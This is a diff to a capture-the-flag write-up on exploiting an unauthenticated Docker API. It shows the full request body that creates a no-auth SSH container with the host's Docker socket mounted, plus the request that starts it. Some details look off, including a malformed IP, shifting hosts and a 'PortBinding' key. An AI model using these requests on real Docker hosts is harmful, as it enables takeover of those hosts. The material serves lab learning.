@@ -34,17 +34,16 @@ This is Docker API version 1.30. Here you can find its documentation:
 https://docs.docker.com/engine/api/v1.30/
 
 
-OK, apperantly the server expose to us the docker deamon itself, so our first goal to reach any kind of control is fullfilled. 
-
-
-**A small side note**, for everyone who's not familiar with the docker API: Now we realize that we probably passed the main vulnerability: The docker deamon is the heart of this server and challenge - if we can send it commands - we won. So this is not really CTF per se, it is more kind of navigating ourself through the docker configuration and misconfiguration.
-
+OK, apperantly the server expose to us the docker deamon itself, so our first goal, to reach any kind of control, is fullfilled. 
 
 Next, lets check this out.
 
+**A small side note**, for everyone who's not familiar with the docker API: Now we realize that we probably passed the main vulnerability: The docker deamon is the heart of this server and challenge - if we can send it commands - we won. So this is not really a CTF per se, it is more kind of navigating ourself through the docker configuration and misconfiguration.
+
+
 
 ## Checking what we're dealing with
-This is my first time with the docker API but I do know a little bit about docker and docker commands, so let see if we can get anything special - lets try to get a list of the containers. I used Postman to send HTTP request:
+This is my first time with the docker API but I do know a little bit about docker and docker commands, so let see if we can get anything special - lets try to get a list of the containers. I used Postman to send HTTP requests:
 ```bash
 http://192.168.253.129:2375/containers/json
 ```
@@ -154,6 +153,100 @@ Permission denied, please try again.
 So, what's going on?
 
 ## Few seconds on docker's ports
-Remember `HostConfig` we've noticed in the wordpress container's inspect request? We can see there a value named `PortBindings`. This value tells us that the docker deamon binds the host machine's 8000 port to the container's 80 port. Every request sent to the host machine to port 8000 is tunneled to port 80 on the wordpress container. This is why we can view the site when we go to http://192.168.253.129:8000. 
+Remember `HostConfig` we've noticed in the wordpress container's inspect request? We can see there a value named `PortBindings`. This value tells us that the docker deamon binds the host machine's 8000 port to the container's 80 port. Every request sent to the host machine to port 8000 is tunneled to port 80 on the wordpress container. By default, all ports on the container are isolated from the outside, and we need explicitly to bind a port for it to be seen from the outside. This is why we can view the site when we go to http://192.168.253.129:8000. 
 
-On the content_ssh_1 container, the `PortBindings` is empty - so no external request is tunneled to this container. 
+On the content_ssh_1 container, the `PortBindings` is empty - so no external request is tunneled to this container. This is explains the Premission denied of the SSH connection - this is the SSH of the host machine, which, for a change - is locked.
+
+OK, we want to bind the SSH port so we can connect to the mysql container. But, this kind of binding can only be done when the container is initiated. This is mean that we need to get our hands a little bit dirty and create and initiate a new container on the remote host.
+
+## Let's get dirty
+The creattion and initiation of containers with the Docker API is quite easy - we just need to know what kind of container and what kind of environment variables we need. 
+
+The image of the SSH container is `jeroenpeeters/docker-ssh` - so we better read it's documentation and understand what is needed for it to work. You can find it [here](https://hub.docker.com/r/jeroenpeeters/docker-ssh/).
+
+Long stroy short (although the long one is not so long):
+- The main idea of this container is to create a SSH connection to containers that does not come with one originally.
+- It doing so by using the EXEC docker command to open a bash in the target container and tunnel it to the SSH connection through the external port, outside.
+- In order to do so, the SSH container needs to initiated with the docker.sock mounted to it. Docker.sock is the socket which the docker deamon is listen to - to get commands.
+- Mounting means that the socket itself (or whatever else you're mounting) is connected from the host machine directly to a  certain path in the container. This means that who ever have access to the container has access to the host machine. Later, we're going to use this feature to scan the host machine files.
+- We need to remember to bind some external ports to port 22 and port 8022 on the container - so we can connect to it.
+- The 8022 port is for a Web API - which is very nice feature of this image.
+
+We know, more or less, what configuration we needs to connect the SSH container to the DB container. Now we need to look at the Docker API to see how we need to configure it. You can see that it is pretty straight forward:
+
+POST request to:
+```bash
+http://192.168.253.129.98:2375/containers/create?name=content_ssh_2
+```
+With body:
+```javascript
+{
+	"Image": "jeroenpeeters/docker-ssh",
+	"Env": [
+	    "AUTH_MECHANISM=noAuth",
+	    "FILTER={\"name\":[\"^/content_db_1$\"]}"
+	],
+    "Ports": [
+        {
+            "IP": "0.0.0.0",
+            "PrivatePort": 22,
+            "PublicPort": 2222,
+            "Type": "tcp"
+        },
+        {
+            "IP": "0.0.0.0",
+            "PrivatePort": 8022,
+            "PublicPort": 8022,
+            "Type": "tcp"
+        }        
+    ],
+	"ExposedPorts": {
+		    "22/tcp": {},
+		    "8022/tcp": {}
+	},
+	"HostConfig": {
+		"Binds": [
+			"/var/run/docker.sock:/var/run/docker.sock",
+			"/usr/bin/docker:/usr/bin/docker"
+		],
+		"PortBinding": {
+			"22/tcp": [
+				{
+					"HostIp": "0.0.0.0",
+					"HostPort": "2222"
+				}
+			], 
+			"8022/tcp": [
+				{
+					"HostIp": "0.0.0.0",
+					"HostPort": "8022"
+				}
+			] 
+		}
+	}
+}
+```
+
+Upon successful creation we will recieve the following response:
+```javascript
+{
+    "Id": "a4ca050cf4e32d01d3c67c83c52eef4fb03f03151de0982230791a9866cd9933",
+    "Warnings": null
+}
+```
+We can reference a container by its Id or by its name.
+
+After creating the container we need to start it, otherwise it's just an image sitting there, doing nothing but aging:
+POST request to:
+```bash
+http://192.168.1.98:2375/containers/content_ssh_2/start
+```
+Status 204 means everything went alright.
+
+Just to make sure we can check the containers list:
+```bash
+http://192.168.1.98:2375/containers/json
+```
+
+
+
